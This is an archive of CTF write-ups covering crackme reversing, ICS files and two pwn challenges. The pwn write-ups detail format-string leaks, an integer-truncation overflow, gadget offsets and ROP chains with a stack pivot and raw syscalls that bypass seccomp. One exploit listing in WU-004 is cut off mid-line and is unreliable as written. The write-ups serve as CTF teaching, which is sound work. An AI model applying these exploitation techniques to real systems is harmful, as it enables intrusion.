# CTF Metaforsec Writeup Archive

13 challenges solved: Reverse Engineering, PWN, ICS/OT, Cryptography,
and Misc/Blockchain. Each writeup is written slowly on purpose the
technical terms get explained in plain language first, before diving
into exploit/decode details, complete with PoC.

13 Challenges Solved · 1,000 pts · REDLIMIT{...}
[Repo: 00-D-CTF ↗](https://github.com/0xnhsec/00-D-CTF)

[Touch Me] Table of Contents / Writeup Menu

TABLE OF CONTENTS (13)

- 01 / REVERSE ENGINEERING

  - WU-001 · 50 pts · Rolling crack_easy
    - Step 1 Find the relevant data
    - Step 2 Read the transform flow from the disassembly
    - Step 3 Invert (reverse the operations)
    - Step 4 Verify against the original binary
  - WU-002 · 50 pts · Three Stages crack_medium
    - ✅ Flag: REDLIMIT{tr1pl3_st4g3_x_4nt1d3bug_pl0t}
  - WU-003 · 50 pts · The Machine crack_hard
    - ✅ Flag: REDLIMIT{cu5t0m_vm_byt3c0d3_ai_g0nn4_5truggl3}

- 02 / PWN

  - WU-004 · 50 pts · mirage
    - 0. Initial recon
    - 1. Reading `leaker()` → bug #1 found (Format String)
    - 2. Reading `main()` → bug #2 found (Buffer Overflow)
    - 3. Checking the seccomp filter → why `system("/bin/sh")` doesn't work directly
    - 4. Finding ROP gadgets in the given libc
    - 5. The problem: the ROP chain we need is too long
    - 6. Assembling the final exploit (pure Python, no pwntools)
    - 7. Validating before hitting the real server
    - Summary of the thought process (if you want to redo it from scratch)
  - WU-005 · 50 pts · spiral Block Reader v2
    - 0. Starting materials
    - 1. Binary recon checksec & functions
    - 2. Bug #1 Format string in `leaker()`
    - 3. Bug #2 Overflow via a buggy size check
    - 4. Measuring the buffer → canary → return-address offsets
    - 5. Building the ROP chain and why it has to go through libc
    - 6. First attempt FAILED (and why)
    - 7. Second attempt hardcoded fd, fails again on remote
    - 8. Final fix grab the fd dynamically from `rax`
    - 9. Why I could be "confident" without remote server access
    - Final flow summary

- 03 / ICS · OT

  - WU-006 · 50 pts · PLC Konveyor
    - File structure (overview)
    - Two things that look like the flag but only one is real
    - Flag
    - Why is this "plausible" as a real-world technique?
    - Pattern summary (applies to both ICS/OT challenges above)
  - WU-007 · 50 pts · Gardu 104
    - What IEC 104 is, briefly
    - How I found the flag step by step
    - Flag
  - WU-008 · 50 pts · Instalasi Air
    - ✅ Flag: REDLIMIT{m0dbus_fc16_r3g1st3r_byt3_0rd3r_r3c0n}

- 04 / CRYPTO

  - WU-009 · 50 pts · Sandi Garuda
    - Challenge Description
    - 1. Source Analysis
    - 2. Building the Mathematical Relation
    - 3. Proof of Concept (Solve Script)
    - 4. Attack Flow Summary
    - Mitigation Notes
  - WU-010 · 50 pts · Overcooked
    - ✅ Flag: REDLIMIT{n0_sCr1pt_n33d3d_no_41_sl0p_}
  - WU-011 · 50 pts · 4xJump Shell
    - ✅ Flag: REDLIMIT{jUmp_1nt0_th3_p0w3rsh3ll_w0rld}

- 05 / MISC · BLOCKCHAIN

  - WU-012 · 150 pts · Geprek Chain
    - 1. Getting to know the challenge
    - 2. Understanding the structure of one block
    - 3. (Optional but recommended) Validate the chain first
    - 4. Try decrypting the genesis block (index 0) and see the trap
    - 5. Decrypt blocks 1–7 and assemble the fragments
    - 6. Combine them in index order
    - 7. Final flag 🎉
    - Quick summary (if you just want to reproduce it)
  - WU-013 · 300 pts · Blockchain Rewardless
    - ✅ Flag: REDLIMIT{Min1ng_BL0cK_Pr00f_0f_Wo0rk_iS_Cr4ZzzY}

01 / REVERSE ENGINEERING

WU-001 · 50 pts

# Rolling crack_easy

Reverse Engineering Easy

**Flag:** `REDLIMIT{r0ll1ng_x0r_1s_junk_f00d_f0r_ai}`

**What was given?** A single 64-bit ELF binary, stripped (meaning the
compiler removed all function/variable names, so we have to read the
raw assembly instruction flow). The challenge description says: there's
one function that checks our input, and the process is a "reversible
per-byte transform" it uses xor + key, adds a constant that changes
per position, and does a bit-rotate.

**What does that mean in practice?** The program stores the "answer"
(target) in encrypted form inside the binary itself. Every character we
type gets scrambled through 3 sequential operations, and the result is
compared against that pre-encrypted answer. Our job: reverse-engineer
the scrambling, invert the order of operations, and recover the
original input that produces the exact same scrambled result as the
stored "answer".

### Step 1 Find the relevant data

Run `strings` on the binary to find a clue from the success message:

    Correct! that input IS the flag.

Dump `.rodata` (the section of the binary holding static data like
strings/arrays):

    2040: 73 33 63 72 33 74 5f 6b 33 79 00 ...      -> "s3cr3t_k3y" (KEY, 10 bytes)
    2060: 12 f4 b2 a3 bd eb 0b 8c 0d 5b 55 6e 24 fd 07 ec
    2070: 8c 5d 15 8d ce b5 5e 7f 11 8e 40 f6 8a 58 b1 ef
    2080: 40 a9 23 d2 52 c2 eb 12 3a                      -> TARGET (41 bytes, encrypted)

### Step 2 Read the transform flow from the disassembly

The check function (identified via `objdump -d`) loops per byte; the
flow is:

    for each index i (0 to 40):
        c = 0x21 + 7*i              # a constant that differs per position, +7 each step
        k = key[i % 10]             # key "s3cr3t_k3y" repeats every 10 chars
        target[i] = rol( (input[i] ^ k) + c , 3 )   # xor, add, rotate-left 3 bits

**Why does the exact order matter?** Because to invert it, the order of
operations must be reversed as well if the invert order is flipped,
the result comes out garbage even though the operations "look" the
same.

### Step 3 Invert (reverse the operations)

``` python
key = b's3cr3t_k3y'
target = bytes.fromhex(
    '12f4b2a3bdeb0b8c0d5b556e24fd07ec'
    '8c5d158dceb55e7f118e40f68a58b1ef'
    '40a923d252c2eb123a'
)

def ror8(x, n):          # opposite of rotate-left = rotate-right
    n %= 8
    return ((x >> n) | (x << (8 - n))) & 0xff

out = bytearray()
c = 0x21
for i, t in enumerate(target):
    r = ror8(t, 3)              # 1. undo the rotate
    v = (r - c) & 0xff          # 2. undo the +c
    p = v ^ key[i % 10]         # 3. undo the xor
    out.append(p)
    c = (c + 7) & 0xff

print(out.decode())
```

**Output:**

    REDLIMIT{r0ll1ng_x0r_1s_junk_f00d_f0r_ai}

### Step 4 Verify against the original binary

    $ echo "REDLIMIT{r0ll1ng_x0r_1s_junk_f00d_f0r_ai}" | ./crack_easy
    Correct! that input IS the flag.

    ✅ Flag: `REDLIMIT{r0ll1ng_x0r_1s_junk_f00d_f0r_ai}`

WU-002 · 50 pts

# Three Stages crack_medium

Reverse Engineering Medium

**Flag:** `REDLIMIT{tr1pl3_st4g3_x_4nt1d3bug_pl0t}`

**What was given?** Another binary that asks for a 39-character
password, and reportedly has **"anti-debug"** if we try to analyze it
with a debugger (a tool for "peeking" at a running program
step-by-step, like `gdb`), the program automatically corrupts itself so
that even the correct password gets rejected.

**What is "anti-debug"?** Imagine taking an exam and the proctor
suspects you're cheating with a calculator the moment an "alarm"
triggers, the answers on your paper randomly scramble. This program has
a similar trick: it calls a system function named `ptrace` that can
"sniff" whether it's being watched by a debugger. If so, one important
variable gets changed, making the password validation fail even if we
enter the correct password.

**Why could we still win?** Because I **never ran the program in a
debugger at all** I only **statically read the assembly code** (like
reading a blueprint without ever powering on the machine). So the
anti-debug trick never triggers.

**Proof (PoC) the 3 password-validation stages I found** (39
characters split into 3 × 13):

| Stage | Character range | Processing formula per letter |
|-------|--------------|--------------------------------------------------------------------------------|
| 1     | 0–12         | bit-rotate + XOR against a small table + add the letter's position |
| 2     | 13–25        | bit-rotate + XOR a fixed number − a "running counter" (increases with each successful letter) |
| 3     | 26–38        | add a fixed number + XOR with the square of the letter's position |

Each stage has a "target answer" (the value to match) stored as a
number table inside the binary file itself (readable directly, not
encrypted). Since I knew the formula and the target, I just had to
**invert the formula** (if normally A→B, I compute B→A) for each
character, one by one, from stage 1 through stage 3.

**Proof run against the original binary:**

    $ echo 'REDLIMIT{tr1pl3_st4g3_x_4nt1d3bug_pl0t}' | ./crack_medium
    Access granted. The input is the flag.

### ✅ Flag: `REDLIMIT{tr1pl3_st4g3_x_4nt1d3bug_pl0t}`

---

WU-003 · 50 pts

# The Machine crack_hard

Reverse Engineering Hard

**Flag:** `REDLIMIT{cu5t0m_vm_byt3c0d3_ai_g0nn4_5truggl3}`

**What was given?** A binary file (a Linux "`.exe`") asking for a
password. The hint: inside this program there's a **custom-built
"virtual machine" (VM)** every character of the password we type gets
run through a series of math operations before being checked right or
wrong.

**What does "custom-built virtual machine" mean?** A normal program
checks a password directly with easy-to-read code
(`if password == "xxx"`). This one is craftier: it builds **its own
little programming language** (just 7 "verbs"/instructions), whose
contents are obfuscated (XORed with `0x5A`), then runs it like "a
program inside the program." This makes it hard to reverse with typical
automated tools it has to be analyzed by hand.

**Proof (PoC) the table of 7 instructions I found** by reading the
program's machine instructions (assembly):

| Code   | Meaning                                                      |
|--------|--------------------------------------------------------------|
| `0x9C` | Fetch the next character from the password we typed          |
| `0x3B` | XOR (bitwise operation) with a specific number                |
| `0x71` | Add a specific number                                         |
| `0x2E` | Subtract a specific number                                    |
| `0x64` | Rotate bits left (rotate)                                     |
| `0xA7` | Multiply by a specific number                                 |
| `0xD5` | Check: the processed result must match the target value exactly |

After decoding this "secret language" (XOR back with `0x5A`), I found
the program has **46 sequential instruction blocks** matching exactly
the required password length (46 characters). Each block does: "take
one letter → run it through some of the operations above → check the
result."

**The good news:** each block is **independent** the check on letter
1 doesn't affect the check on letter 2, and so on. So I didn't need to
guess all 46 letters at once (which would be impossible) I just had
to try 1 letter per block out of 256 possibilities (`a`-`z`, `A`-`Z`,
digits, symbols, etc.) fast for a computer.

**Proof run against the original binary:**

    $ echo 'REDLIMIT{cu5t0m_vm_byt3c0d3_ai_g0nn4_5truggl3}' | ./crack_hard
    VM accepted. Input is the flag.

### ✅ Flag: `REDLIMIT{cu5t0m_vm_byt3c0d3_ai_g0nn4_5truggl3}`

---

02 / PWN

WU-004 · 50 pts

# mirage

PWN Easy

Target: binary `mirage` + `libc.so.6` + `ld-linux-x86-64.so.2` (loader)
+ `Dockerfile`. Goal: read `flag.txt` that lives on the server (not the
flag in the binary that's just a DECOY).

Overall exploit flow: **Format String Leak → Buffer Overflow → ROP
(bypass seccomp) → read the file**.

---

## 0. Initial recon

``` bash
file mirage libc_so.6 ld-linux-x86-64_so.2
readelf -h mirage | grep Type          # DYN (PIE)
readelf -l mirage | grep -E "GNU_STACK|GNU_RELRO"
nm mirage | grep -v ' U '              # see which functions exist
strings -n 6 mirage                    # look for interesting strings
```

Key takeaways from this:

- The binary is **PIE**, has a **canary** (stack protector active,
  visible from the `__stack_chk_fail` function).
- Only 2 custom functions exist: `main` and `leaker`.
- There's a `"seccomp"` string → meaning this process installs a
  **seccomp filter** (restricting which syscalls are allowed).
- A decoy string exists: `DECOY{...}` this is a trap, not the real
  flag.
- The Dockerfile states clearly: **the real flag only exists on the
  server** (`flag.txt`), and the libc+loader given match **exactly**
  what the server uses, so every gadget offset I calculate locally
  **will definitely be valid** on remote.

---

## 1. Reading `leaker()` → bug #1 found (Format String)

``` bash
objdump -d -M intel mirage --disassemble=leaker
```

In essence `leaker()` does:

``` c
void leaker(void) {
    char name[0xa0];
    printf("name> ");
    fgets(name, 0xa0, stdin);
    name[strcspn(name, "\n")] = 0;
    printf("hello, ");
    printf(name);   // <-- BUG: user input used DIRECTLY as a format string!
}
```

`printf(name)` not `printf("%s", name)` means that if we send
`%p %p %p`, it gets parsed as *format specifiers* by `printf`. This is
a classic **format string vulnerability**, usable to **read the stack
contents** (canary, PIE address, libc address) without needing any
kind of crash.

### Finding the exact offset

I didn't guess blindly I **ran the binary locally** (using the exact
same loader & libc that were given to us), then sent the payload
`%1$p|%2$p|...|%N$p` and observed which value appeared at which
position:

``` python
import subprocess, select, os
p = subprocess.Popen(['./ld.so', '--library-path', '.', './mirage_bin'],
                      stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
# ... send "%26$p|%27$p|%28$p|%29$p\n" as the name, read the result
```

From repeated trials (the canary is random per process, so I repeated
it a few times to confirm the pattern was consistent):

| Offset  | Contents                       | Identifying trait                                  |
|---------|------------------------------|----------------------------------------------------|
| `%27$p` | **Stack canary**             | always ends in byte `00` (a glibc canary trait)     |
| `%29$p` | **Return address into `main`** | `mirage_base + 0x14e6` (constant every run)         |
| `%61$p` | **An address inside libc**   | `libc_base + 0x29f75` (constant every run)           |

Since the offset relative to the stack frame is **fixed** (only the
actual value is randomized by ASLR), once found once, the formula
`base = leaked_value - constant_offset` will always hold.

> **How was this offset found?** Because `leaker()` just does
> `printf(name)` with no extra arguments. `printf` still needs "content"
> for every `%p`, so it pulls from registers (`rsi,rdx,rcx,r8,r9`) then
> continues reading upward through the **stack**. It happens that after
> a few register slots, `printf` starts reading **our own buffer**
> (because that buffer is also on the stack), and once our buffer runs
> out it continues reading real stack data beyond it (canary, return
> address, etc.).

---

## 2. Reading `main()` → bug #2 found (Buffer Overflow)

    lea rdi,[rip+...]   ; "in> "
    call printf@plt
    lea rsi,[rsp+0xa0]  ; buffer
    mov edx,0xb0        ; read 176 bytes!
    mov edi,0
    call read@plt

The buffer is allocated at `rsp+0xa0`, but `read()` is asked to read
**0xb0 (176) bytes** while the distance from the buffer to the canary
is only **72 bytes**. This is a classic **stack buffer overflow**:

    [0:72)   junk / can be anything
    [72:80)  must EXACTLY match the canary we already leaked (wrong → __stack_chk_fail → crash)
    [80:88)  8-byte padding (free to use, a byproduct of there being no `push rbp`)
    [88:96)  RETURN ADDRESS -> this is where we start controlling execution
    [96:176) remaining 80 bytes -> usable for the first stage of a ROP chain

176 bytes total, exactly.

---

## 3. Checking the seccomp filter → why `system("/bin/sh")` doesn't work directly

At the start of `main()` there's code that manually builds a **BPF
seccomp filter** (a series of `mov WORD/DWORD PTR [rsp+...]` lines). I
manually decoded the `sock_filter` struct (8 bytes per entry:
`code(2) jt(1) jf(1) k(4)`), and the result is the list of syscalls
**allowed**:

    read, write, open, openat, close, lseek, fstat, newfstatat, brk, exit, exit_group

**`execve` is NOT in the list** → so a "ret2libc using
`system()`/shell" strategy **won't work** even if we successfully take
control of RIP. So the strategy has to be: **pure ROP using direct
syscalls** for `open("flag.txt")` → `read()` its contents → `write()`
to stdout.

---

## 4. Finding ROP gadgets in the given libc

Since there's no `pwntools`/`ROPgadget` in my environment (no internet
access to install anything), I found gadgets by **manually scanning
byte patterns** directly in the `libc.so.6` file:

``` python
with open('libc.so.6','rb') as f:
    data = f.read()

text_start, text_end = 0x28400, 0x28400 + 0x1671ad  # from readelf -S .text

def find_all(pattern):
    res, s = [], text_start
    while True:
        idx = data.find(pattern, s, text_end)
        if idx == -1: break
        res.append(idx); s = idx + 1
    return res

print(find_all(b'\x5f\xc3'))        # pop rdi; ret
print(find_all(b'\x5e\xc3'))        # pop rsi; ret
print(find_all(b'\x5a\xc3'))        # pop rdx; ret
print(find_all(b'\x58\xc3'))        # pop rax; ret
print(find_all(b'\x0f\x05\xc3'))    # syscall; ret
print(find_all(b'\x5c\xc3'))        # pop rsp; ret  <- for a "stack pivot"
```

Gadgets used (offset from the libc base):

    pop rdi; ret   -> 0x2a9b7
    pop rsi; ret   -> 0x29e29
    pop rdx; ret   -> 0x96372
    pop rax; ret   -> 0x44386
    syscall; ret   -> 0x926e2
    pop rsp; ret   -> 0x2861a

> Note: I didn't verify these using plain `objdump` (because `objdump`
> disassembles from the start of a section, so if a gadget "hides"
> inside another instruction's bytes, the disassembly view can be
> misleading). The correct way: **read the raw bytes directly** at that
> offset if the bytes really are `5f c3`, then the moment the CPU
> starts executing exactly at that address, it's **definitely**
> `pop rdi; ret`, regardless of what the "original" instruction was in
> another context.

---

## 5. The problem: the ROP chain we need is too long

The ROP space we get from the overflow is only **80 bytes (10 qwords)**
after the return address not enough for a full chain
(`open`+`read`+`write`+`exit` needs ~32 qwords).

**Solution: a 2-stage stack pivot.**

- **Stage 1** (fits in the 11 available slots): call
  `read(0, bss_address, 0x400)` to receive a **longer** ROP chain, then
  `pop rsp; ret` to move RSP into that `.bss` address.
- **Stage 2**: once RSP has been moved, the next `ret` automatically
  "consumes" the data we just `read()`-ed in as the next gadgets so
  the ROP chain can now be as long as needed, sent over the same socket
  connection, without the earlier 80-byte limit.

<!-- -->

    Stage 1 (176 bytes, the buffer-overflow payload):
      junk(72) + canary(8) + junk(8) +
      pop_rdi, 0                 ; rdi = 0 (stdin)
      pop_rsi, BSS_ADDR          ; rsi = destination
      pop_rdx, 0x400             ; rdx = size
      pop_rax, 0                 ; rax = sys_read
      syscall                    ; read(0, BSS_ADDR, 0x400)  <- waiting for stage2 data
      pop_rsp, BSS_ADDR          ; PIVOT!

    Stage 2 (sent right after stage1, written into BSS_ADDR by the read() syscall above):
      pop_rdi, address_of_"flag.txt"
      pop_rsi, 0
      pop_rdx, 0
      pop_rax, 2                 ; sys_open
      syscall                    ; open("flag.txt", O_RDONLY) -> fd (assuming fd=3)

      pop_rdi, 3
      pop_rsi, BSS_FLAGBUF
      pop_rdx, 0x200
      pop_rax, 0                 ; sys_read
      syscall                    ; read(3, buf, 0x200)

      pop_rdi, 1
      pop_rsi, BSS_FLAGBUF
      pop_rdx, 0x200
      pop_rax, 1                 ; sys_write
      syscall                    ; write(1, buf, 0x200)  -> FLAG APPEARS!

      pop_rdi, 0
      pop_rax, 231                ; sys_exit_group
      syscall

The `"flag.txt"` string itself is already embedded in the binary
(global variable `fname`, at `.data` offset `0x4020`) so there's no
need to write a new string, just reuse its address
(`mirage_base + 0x4020`).

For scratch space for the stage-2 chain and the flag-content buffer, I
used the writable `.bss` region (`mirage_base + 0x4090` and `+0x4300`)
first checked with `readelf -l` to confirm that area is really
mapped RW and large enough.

---

## 6. Assembling the final exploit (pure Python, no pwntools)

Since my sandbox has no internet access for `pip install pwntools`, I
wrote a manual version:

- `Conn` class: can run over either a **subprocess pipe** (for local
  testing) or a **TCP socket** (for the real server) the exploit
  logic is identical for both.
- Send `"%27$p|%29$p|%61$p\n"` → parse the results into `canary`,
  `mirage_base`, `libc_base`.
- Build `stage1` (176 bytes, must be exact) and `stage2` (the gadget
  chain above).
- Send `stage1`, wait briefly, send `stage2`, read the result that's
  the content of `flag.txt`.

``` python
def p64(x): return struct.pack(' flag.txt   # create a fake flag
python3 exploit.py --local                            # run through subprocess, not a socket
```

Once `CTF{local_test_flag_not_real}` appears in the output, it means
**the entire chain is correct** (leak offset, canary match, gadget
addresses, pivot, syscalls) just switch the target to
`--host  --port ` and run it against the real server.

---

## Summary of the thought process (if you want to redo it from scratch)

1.  `file` + `readelf` + `nm` + `strings` → identify protections &
    existing functions.
2.  Read the disassembly of each custom function one by one → look for
    familiar bug patterns (`printf(var)` = format string, `read()`
    with a size bigger than the distance to the canary = overflow).
3.  If there's seccomp → **always decode the filter**, don't assume
    `execve` is possible.
4.  Find the leak offset through **controlled experimentation** on the
    local binary (`%N$p` one by one / several at once), and verify it
    stays consistent across multiple runs.
5.  Find gadgets by scanning byte patterns directly in the given libc
    (not guessing from a different libc).
6.  If ROP space is insufficient → **stack pivot** into a writable area
    (`.bss`) to hold a longer chain.
7.  **Always test locally first** (using a fake flag.txt) before trying
    the real server so if it fails, you know it's a logic bug (which
    can be debugged) rather than a connection/network issue.

WU-005 · 50 pts

# spiral Block Reader v2

PWN Medium

## 0. Starting materials

Given 4 files: - `spiral` the target binary (PIE, x86-64) -
`libc_so.6`, `ld-linux-x86-64_so.2` the libc & loader **pinned**
exactly to what the server uses (this is key: it means every
gadget/symbol offset we measure on this libc will be identical on
remote) - `Dockerfile` shows how the binary is run
(`socat ... EXEC:'./ld-linux-x86-64.so.2 --library-path . ./spiral',stderr`)

Clue from the challenge:

> "The size you thought was safe turns out not to be. The sandbox
> closes a door that's usually open."

Two important clues are already given up front: there's a bug in the
**size validation**, and the **sandbox (seccomp)** closes something
"that's usually open" this becomes relevant at the very last step.

## 1. Binary recon checksec & functions

    NX      : enabled   (GNU_STACK RW, no E)
    PIE     : enabled
    RELRO   : full (BIND_NOW)
    Canary  : present (__stack_chk_fail is called)

Only two user functions exist: `leaker()` and `main()`. The name
`leaker` is already a big hint: this function is designed to "leak"
something.

The disassembly flow of `main()`: 1. `prctl(PR_SET_NO_NEW_PRIVS, 1)` 2.
`prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &sock_fprog)` → **installs
a seccomp BPF filter** 3. `puts("Spiral Block Reader v2")` 4. calls
`leaker()` 5. `printf("blocks(4 bytes)> ")` 6. `read(0, &size, 4)` —
reads 4 raw bytes as a size integer 7. checks the size's validity
(discussed below) 8. if valid: `read(0, buf, size*64)` into a
stack buffer 9. checks the stack canary, `ret`

## 2. Bug #1 Format string in `leaker()`

``` c
printf("name> ");
fgets(buf, 0xa0, stdin);
strcspn(buf, "\n");            // trim newline
printf("hello, ");
printf(buf);                   // <-- BUG: buf becomes a FORMAT STRING, not an argument!
```

`buf`, whose contents are fully user-controlled, is used directly as a
**format string** to `printf`. This is a classic **format string
vulnerability** → usable for an *arbitrary read* from the stack (leak
addresses) via `%p`/`%x`, and even an *arbitrary write* via `%n` (not
used here, just reading is enough).

Since `buf` also physically sits **on the same stack** that `printf`
reads from as its vararg spill area, we can use the *positional
specifier* `%N$p` to read the Nth qword from that point including
`buf`'s "neighbor" data like: - the stack canary - the return address
(back to `main`, leaking the PIE base) - leftover libc addresses from
earlier function calls

### Finding the right index (`%N$p`)

I didn't guess manually I **compiled & ran the exact
binary+libc+ld.so uploaded, locally** in my sandbox
(`./ld.so --library-path . ./spiral`), then brute-forced index `%1$p`
through `%40$p` one by one, while reading `/proc//maps` mid-execution
(pausing my process while it waits for the second input) to learn the
`spiral` and `libc` base addresses at that moment.

That revealed a pattern **consistent across runs** (the base differs
every run due to ASLR, but the *offset* from the base is always the
same):

| Index   | Contents                                  | Formula                        |
|---------|------------------------------------------|-------------------------------|
| `%21$p` | address inside libc                     | `libc_base = leak - 0x8224a` |
| `%27$p` | stack canary (always ends in byte `00`) | used directly as-is           |
| `%29$p` | return address `leaker()` → `main()`    | `pie_base = leak - 0x14c5`   |

Leak payload: `%21$p|%27$p|%29$p\n` sent as the "name".

## 3. Bug #2 Overflow via a buggy size check

``` c
read(0, &size, 4);                 // size: user-controlled, raw 32-bit
uint32_t x = size << 6;            // x = size * 64
if ((uint16_t)(x - 1) > 0x3f)      // <-- BUG IS HERE
    goto too_big;                  // print error message, skip the overflow read
read(0, buf, x);                   // this is the overflow, but only reached if the check passes
```

The programmer's intent: limit `size` so that `size*64 <= 64` (i.e.
`size <= 1`), because only the **low 16 bits** of `(size*64 - 1)` are
checked, not the full 32 bits. This is a classic **integer truncation**
bug.

Because `size*64` wraps `mod 2^32` and only its **lowest 16 bits** get
checked, we can find a `size` such that: - `x = size*64` is **large**
(so the buffer overflows far enough, hundreds/thousands of bytes) -
but `x mod 65536` still falls within `1..64` (so it passes the check)

I tried: `size = 4097` (`0x1001`) →

    x = 4097 * 64 = 262208 = 0x40040
    x mod 65536   = 0x40   = 64   ✅ within [1,64]

That means the check **passes**, but the second `read()` still gets a
capacity of **262,208 bytes** more than enough to overflow the
return address and inject a long ROP chain.

*(Finding this number wasn't mental arithmetic I wrote a short Python
script to find a `size` satisfying both conditions, then immediately
verified locally: sent this size + payload, checked the process didn't
print a "size rejected" message and stayed alive waiting for the
overflow read.)*

## 4. Measuring the buffer → canary → return-address offsets

From the `main()` disassembly:

    sub rsp, 0xe8          ; allocates 232 bytes, WITHOUT any prior register push
    ...
    mov [rsp+0xd8], canary ; canary stored at rsp+0xd8
    ...
    lea rsi, [rsp+0x90]    ; the overflowable buffer starts at rsp+0x90

So from the **start of the buffer**: - offset `0x48` (=`0xd8-0x90`) →
canary (8 bytes) - offset `0x50` → 8-byte unused "gap" (since there's
no `push` in the prologue, it's just alignment padding) - offset
`0x58` (=`0xe8-0x90`) → **return address**

I validated this empirically too: sent a payload with the correct
canary (from the leak) but a return address of `0x4141414141414141`,
expecting: - **no** `*** stack smashing detected ***` message (meaning
the canary check passed) - the process crashing with `SIGSEGV` while
trying to execute address `0x4141...`

The result matched exactly → my offsets were 100% correct.

## 5. Building the ROP chain and why it has to go through libc

Since RELRO is full + PIE is on, the easiest target is **ret2libc**:
call real libc functions (`open`, `read`, `write`, `exit`) through
`pop reg; ret` gadgets to set up arguments in `rdi`/`rsi`/`rdx`.

### Finding gadgets without `ropper`/`gdb`

My sandbox has no internet access (can't
`pip install pwntools`/`ropper`/`apt install gdb`), so I scanned for
gadgets **manually by byte pattern** directly in the `libc_so.6` file:

``` python
pop rdi; ret  ->  bytes([0x5f, 0xc3])
pop rsi; ret  ->  bytes([0x5e, 0xc3])
pop rdx; ret  ->  bytes([0x5a, 0xc3])
pop rax; ret  ->  bytes([0x58, 0xc3])
syscall; ret  ->  bytes([0x0f, 0x05, 0xc3])
```

Find all occurrences of that pattern in the file, filter down to ones
that fall inside the **executable segment** (r-x, file offset
`0x28000`–`0x190000` per `/proc/maps`), then verify each candidate
with `objdump -d --start-address=... --stop-address=...` to confirm it
really is a valid instruction and not a coincidental byte fragment of
another instruction.

The addresses of the target functions (`open`, `read`, `write`,
`exit`) I took directly from `nm -D libc.so.6`.

## 6. First attempt FAILED (and why)

My initial chain:

    read(0, BSS, 16)                 # write the filename "flag.txt" to .bss
    open(BSS, 0, 0)                  # call the LIBC version of open()
    read(3, BSS, 0x100)              # assuming the fd from open = 3
    write(1, BSS, 0x100)             # print out the flag content
    exit(0)

I tested locally (`./ld.so --library-path . ./spiral`) **instant
crash**, process exit code = `-31` = **SIGSYS**. That's the signature
kill signal from **seccomp**.

I re-checked the BPF filter in `main()` (manually decoded from the
`mov` instructions that build the `sock_filter` struct on the stack):
the only syscall allowed is **`open` (nr=2)**, NOT **`openat` (nr=257)**.

The problem: **modern glibc's `open()` no longer calls the `open`
syscall directly** since roughly glibc 2.26+, the `open()` wrapper is
implemented via the `openat(AT_FDCWD, ...)` syscall. So even though we
call a function named `open()`, under the hood it issues syscall number
257, which **is blocked by the filter** → the process gets instantly
`SIGSYS`-killed.

**This matches the challenge clue exactly**: *"The sandbox closes a
door that's usually open."* the door that's "usually open" is
`openat` (since almost all modern libc file calls go through it), and
that's exactly what the sandbox blocks. The fix: don't call libc's
`open()`, but **issue the raw `open` syscall (nr 2) directly** using a
`pop rax; ret` gadget (to set the syscall number) + `syscall; ret`.

## 7. Second attempt hardcoded fd, fails again on remote

First fix: replace the `open()` call with a raw syscall:

    pop rax, 2                  ; open() syscall number
    pop rdi, BSS                ; path
    pop rsi, 0                  ; flags O_RDONLY
    pop rdx, 0                  ; mode
    syscall; ret                 ; rax = fd

Immediately succeeded locally got the content of my local
`flag.txt`. But once tried against the **remote server**, the
connection just closed with no output at all.

The cause: the following chain still **hardcodes `fd = 3`** for
`read(fd, BSS, ...)`. That assumption was valid in my local test
(since the process only has fds 0/1/2 from a plain pipe), but **isn't
necessarily valid on the server** `socat` with the
`EXEC:...,stderr` option might already hold an extra fd before exec, so
the fd returned by `open()` on the server isn't guaranteed to be
exactly 3.

## 8. Final fix grab the fd dynamically from `rax`

Solution: don't guess the fd at all. After the `open` syscall
completes, `rax` **always** holds the fd (or a negative errno on
failure) just move it into `rdi` as the argument for the next
`read()`.

I looked for a "move rax to rdi" gadget initially picked the wrong
opcode (`0x93`, which I thought was `xchg eax,edi` but is actually
`xchg eax,ebx`, not `edi`!). After re-checking the x86 opcode table,
the correct `xchg edi,eax` is **`0x97`**. I rescanned, found it, and
verified it with a small isolated test (`pop rdi=99; pop rax=7; xchg;
exit()` → should exit with code 7 if the gadget is right) and after
using the correct opcode, the result matched expectations exactly.

Final chain:

    read(0, BSS, 16)                         # user sends "flag.txt\0" over the socket
    pop rax=2; pop rdi=BSS; pop rsi=0; pop rdx=0; syscall   # raw open(BSS,O_RDONLY,0) -> rax=fd
    xchg edi, eax; ret                       # rdi = fd (NOT guessed, taken directly from open's result)
    pop rsi=BSS; pop rdx=0x200; read()       # read(fd, BSS, 0x200) -> flag content lands in BSS
    pop rdi=1; pop rsi=BSS; pop rdx=0x200; write()  # write(1, BSS, 0x200) -> flag printed to the socket
    pop rdi=0; exit()

I re-validated this end-to-end locally (leak → overflow → ROP → my
local `flag.txt` content coming back over the socket) before giving you
the final `exploit_spiral.py`.

## 9. Why I could be "confident" without remote server access

Every magic number in the final script (`0x8224a`, `0x14c5`, gadget
addresses, function addresses, `.bss` offsets) **wasn't memorized or
guessed** all of it was measured directly from the **`spiral`,
`libc_so.6`, `ld-linux-x86-64_so.2` files you uploaded**, by:

1.  Manual disassembly (`objdump`) to understand the program flow &
    seccomp filter struct.
2.  Running the binary **locally** in my sandbox using the exact same
    loader & libc (since the `Dockerfile` states the loader/libc are
    pinned, so they're identical to the server).
3.  Every claim (leak offset, canary/return-address offset, gadget
    validity, seccomp behavior) **proven with a small, isolated
    experiment** first before being used in the larger chain which
    is why once something went wrong (the fd=3 assumption, the wrong
    xchg opcode), I could quickly find the root cause through a process
    of elimination, rather than guessing from scratch again.

Since the remote binary+libc+loader are **identical** to what I tested
locally (by design of the challenge that's why those files were
deliberately given to participants), all those offsets should transfer
1:1 to the server the only thing that differs is the **base address**
(ASLR), and that's exactly what gets leaked first, before the ROP chain
is ever sent.

## Final flow summary

    leak (%21$p/%27$p/%29$p)  →  compute libc_base & pie_base & get the exact canary
       → send size=4097 (bypass the buggy check)
       → send payload: filler + real canary + filler + ROP chain
       → ROP: read filename from socket → RAW SYSCALL open (not libc open!)
            → grab fd from rax → read file contents → write to socket
       → flag appears in the output

03 / ICS · OT

WU-006 · 50 pts

# PLC Konveyor

ICS / OT

**Flag:** `REDLIMIT{s7_d4t4bl0ck_1nt_4rr4y_symb0l_p4rs3}`

**File:** `project.s7p` (681 bytes, a Siemens S7 PLC project dump)

### File structure (overview)

This file contains several **blocks** (marked by the magic bytes
`S7B`), essentially "folders" holding program code (`OB1`) and data (a
data block "recipe" for the conveyor: speed, temperature, batch ID,
etc.).

### Two things that look like the flag but only one is real

